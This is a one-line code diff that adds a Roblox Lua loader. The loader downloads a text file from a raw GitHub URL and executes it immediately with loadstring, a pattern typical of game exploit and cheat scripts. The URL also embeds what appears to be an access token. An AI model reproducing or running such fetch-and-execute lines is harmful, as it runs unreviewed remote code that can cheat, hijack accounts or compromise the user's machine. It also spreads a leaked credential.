@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Haider6400/YTDD/refs/heads/main/--yAloneBu--yo.txt?token=GHSAT0AAAAAACWBCEEH7HPXQZY424SV5PAIZXOIIRA"))()
